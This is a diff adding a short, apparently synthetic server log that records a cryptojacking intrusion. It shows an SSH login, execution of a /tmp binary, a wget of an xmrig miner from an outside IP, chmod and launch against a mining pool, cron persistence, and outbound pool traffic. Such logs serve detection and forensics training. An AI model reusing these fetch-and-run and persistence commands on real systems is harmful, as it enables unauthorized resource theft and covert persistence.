@@ -1,0 +1,27 @@
+Feb 15 19:50:01 webserver sshd[10021]: Accepted password for ubuntu from 203.0.113.88 port 61111 ssh2
+Feb 15 19:50:01 webserver sshd[10021]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+
+Feb 15 19:50:10 webserver syslog: ubuntu executed file /tmp/kdevtmpfsi
+Feb 15 19:50:10 webserver audit[10040]: EXECVE argc=1 a0="/tmp/kdevtmpfsi"
+Feb 15 19:50:10 webserver audit[10040]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 comm="kdevtmpfsi" exe="/tmp/kdevtmpfsi"
+
+Feb 15 19:50:12 webserver kernel: kdevtmpfsi[10040]: ELF binary running from /tmp directory
+Feb 15 19:50:15 webserver syslog: kdevtmpfsi[10040]: downloading xmrig miner binary
+Feb 15 19:50:16 webserver audit[10045]: EXECVE argc=3 a0="/usr/bin/wget" a1="http://185.203.116.200/xmrig" a2="-O /tmp/.xmrig"
+
+Feb 15 19:50:20 webserver audit[10050]: EXECVE argc=2 a0="/bin/chmod" a1="+x /tmp/.xmrig"
+Feb 15 19:50:21 webserver audit[10051]: EXECVE argc=2 a0="/tmp/.xmrig" a1="--donate-level=1 --url pool.minexmr.com:3333"
+
+Feb 15 19:50:22 webserver syslog: xmrig[10051]: CPU usage 98%
+Feb 15 19:50:23 webserver syslog: xmrig[10051]: connected to pool.minexmr.com:3333 (TLS enabled)
+
+Feb 15 19:50:25 webserver CRON[10060]: (ubuntu) CMD (*/5 * * * * /tmp/.xmrig --donate-level=1)
+Feb 15 19:50:26 webserver audit[10061]: PATH item=0 name="/var/spool/cron/crontabs/ubuntu" inode=55001 dev=08:01 mode=0100600 ouid=1000 ogid=1000
+
+Feb 15 19:50:30 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=45.76.23.199 LEN=60 TOS=0x00 TTL=64 ID=76001 PROTO=TCP SPT=43221 DPT=3333
+Feb 15 19:50:31 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=45.76.23.199 LEN=60 TOS=0x00 TTL=64 ID=76002 PROTO=TCP SPT=43222 DPT=3333
+
+Feb 15 19:51:01 webserver CRON[10075]: (ubuntu) CMD (/tmp/.xmrig --donate-level=1)
+Feb 15 19:51:02 webserver syslog: xmrig[10080]: mining job started (algo=RandomX)
+
+Feb 15 19:52:00 webserver sshd[10021]: pam_unix(sshd:session): session closed for user ubuntu
